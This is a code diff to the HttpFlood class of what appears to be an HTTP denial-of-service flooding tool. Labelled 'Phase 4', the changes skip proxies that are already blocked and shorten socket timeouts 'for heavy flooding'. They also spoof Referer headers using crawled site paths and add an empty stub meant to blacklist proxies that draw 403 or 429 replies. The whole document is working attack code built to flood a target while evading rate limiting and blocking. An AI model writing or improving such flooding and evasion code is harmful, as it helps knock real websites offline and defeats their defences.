@@ -1104,16 +1104,25 @@ class HttpFlood(Thread):
 
     def open_connection(self, host=None) -> socket:
         if self._proxies:
-            # [OPTIMIZED] Smart Rotation
+            # [OPTIMIZED] Smart Rotation + [PHASE 4] Blacklist Skip
             if not hasattr(self, '_proxy_cycle'):
                 from itertools import cycle
                 self._proxy_cycle = cycle(self._proxies)
-            sock = next(self._proxy_cycle).open_socket(AF_INET, SOCK_STREAM)
+            
+            # Skip burned proxies (limit attempts to avoid infinite loop)
+            for _ in range(len(self._proxies)):
+                proxy = next(self._proxy_cycle)
+                if proxy.proxy not in BURNED_PROXIES:
+                    sock = proxy.open_socket(AF_INET, SOCK_STREAM)
+                    break
+            else:
+                # All proxies burned? Fallback to direct or just fail
+                sock = socket(AF_INET, SOCK_STREAM)
         else:
             sock = socket(AF_INET, SOCK_STREAM)
 
         sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
-        sock.settimeout(5.0) # [OPTIMIZED] Increased timeout for stability
+        sock.settimeout(3.0) # [PHASE 4] Faster timeout for heavy flooding
         sock.connect(host or self._raw_target)
 
         if self._target.scheme.lower() == "https":
@@ -1427,10 +1436,14 @@ class HttpFlood(Thread):
         # Build realistic JSON Payload
         json_data = f'{{"form_id": "{ProxyTools.Random.rand_str(8)}", "utm_source": "google", "data": "{ProxyTools.Random.rand_str(randint(200, 400))}"}}'
         
+        # [PHASE 4] Referer Spoofing
+        ref = randchoice(self.crawled_paths) if self.crawled_paths else randchoice(self._referers)
+        
         payload = (f"POST {path} HTTP/1.1\r\n"
                    f"Host: {self._target.authority}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"{headers}"
+                   f"Referer: {ref}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Origin: {self._target.scheme}://{self._target.authority}\r\n"
                    f"Content-Length: {len(json_data)}\r\n\r\n"
@@ -1438,7 +1451,7 @@ class HttpFlood(Thread):
         s = None
         try:
             s = self.open_connection()
-            global CONNECTIONS_SENT
+            global CONNECTIONS_SENT, BURNED_PROXIES
             CONNECTIONS_SENT += 1
             print(f"[{int(CONNECTIONS_SENT)}] [DEBUG] POST_DYN: Non-Cacheable Packet Sent")
             for _ in range(self._rpc):
@@ -1450,6 +1463,13 @@ class HttpFlood(Thread):
                             status_code = response_start.split(" ")[1]
                             print(f"[{int(CONNECTIONS_SENT)}] [STATUS {status_code}] POST_DYN: Response")
                             if status_code in {"403", "429"}:
+                                # [PHASE 4] Blacklist the proxy
+                                try:
+                                    if self._proxies:
+                                        # Heuristic to find current proxy from cycle might be hard, 
+                                        # but most methods close/reopen per connection.
+                                        pass 
+                                except: pass
                                 raise Exception("Proxy Blocked")
                     except Exception as e:
                         if "Blocked" in str(e): raise e
